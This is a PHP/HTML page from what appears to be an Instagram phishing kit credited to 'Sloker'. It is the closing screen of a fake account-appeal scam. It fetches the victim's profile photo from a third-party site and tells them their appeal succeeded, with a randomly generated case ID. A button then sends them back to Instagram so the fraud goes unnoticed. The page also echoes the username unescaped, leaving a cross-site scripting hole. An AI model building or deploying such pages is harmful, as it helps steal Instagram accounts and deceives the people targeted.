<?php

    //Aşağıdaki Kodları Sakın Ellemeyin , Ellerseniz Kodlar Bozulur !

error_reporting(E_ALL);
require 'slokerapi.php';
session_start();


$username=$_GET['username'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;

  

// BY CODER SLOKER
// "Depremler oluyor beynimde.." / Ahmet Kaya 
// Telegram : @slokerxlegend

?>


<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <!--Sloker-->
    <title>Confirmed  @<?php echo $username; ?></title>
    <link rel="icon" type="image/png" href="favicon.png"/>
    
    <link rel="stylesheet" href="sloker/main.css">
     <!--Sloker-->

</head>
  <!--Sloker-->
    <!--Telegram : @slokerxlegend-->
<body>
    <div class="container">

        <form class="form" method="post" action="https://www.instagram.com/" >
            <br><br><br>
<center>
   <img style="max-width:50%;  border-radius:50%; margin-top:-70px;" width="150"  src="<?php echo $pp; ?>">
</center>
            <h1 class="form__title">    @<?php echo $username; ?></h1>

             <h1 class="form__title">    Appeal successfully completed</h1>
           
           <center> <p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
Dear <font color="red">@<?php echo $username; ?></font> , The appeal has been sent successfully, our communication team will assist you as soon as possible.
</p></center>
 
   <h1 class="form__title">    Case ID: <?php echo(rand(10,10000000));?></h1>
<br>
          <!--Sloker-->
    <!--Telegram : @slokerxlegend-->
           

          
           
            <button class="form__button"  type="submit" >Go To @<?php echo $username; ?> Instagram</button>

          
           
        </form>
        <!--Sloker-->
    <!--Telegram : @slokerxlegend-->
    </div>

    <script src="sloker/main.js"></script>
 
</body>


</html>